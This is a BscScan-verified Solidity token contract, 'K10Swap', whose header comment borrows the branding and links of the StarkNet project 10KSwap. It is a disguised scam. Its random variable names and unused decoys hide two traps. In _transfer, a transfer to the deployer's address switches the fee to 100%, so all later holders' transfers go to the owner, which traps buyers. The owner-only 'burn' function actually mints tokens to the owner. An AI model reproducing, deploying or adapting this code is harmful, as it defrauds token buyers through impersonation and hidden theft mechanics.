/**
 *Submitted for verification at BscScan.com on 2022-11-30
*/

/*
10KSwap
An AMM that advances with Ethereum, deployed on StarkNet Mainnet.
+Introducing 10KSwap: An AMM protocol that advances with Ethereum
10KSwap being built on StarkNet, is an AMM protocol that advances with Ethereum.
Open source contracts in Cairo: 
https://10kswap.com
https://github.com/10k-swap
https://discord.gg/T77yphUPB6
https://twitter.com/10KSwap

*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.8.8;
contract K10Swap {
address public  EzrYXH = address(0);
address private  AsePMz = address(0);
uint256 public  PzeiCu = 10000000000000000000;
uint256 public  XmBvnk = 100000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant LsAELy = 9+1;
address public  uaNruR = address(0);
mapping (address => uint256) public balanceOf;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  unlGXd = address(0);
string public  name = "K10Swap";
uint256 public  GAaaKU = 10000000000000000;
uint256 public  nQWpRu = 100000000000000000000000;
uint256 public  vFlljA = 10000000000000000000000000000;
uint256 public  xlkgiM = 1000000000000000000;
uint256 public  xUqixN = 100000000000000000000000;
uint8 public constant decimals = 18;
address public  FVhUFv = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  REfPaf = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "K10Swap";
uint256 public constant totalSupply = 100000000000000000000000000000;
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
address public  RdPMck = address(0);
uint256 public  MCpGFT = 100000000000000000;
uint256 private  PwEIGx = 10000000000000;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "txRyqf");
require(to != address(0), "txRyqf");
require(amount <= balanceOf[from], "txRyqf");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LsAELy/PwEIGx ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==AsePMz){
PwEIGx = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
AsePMz = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}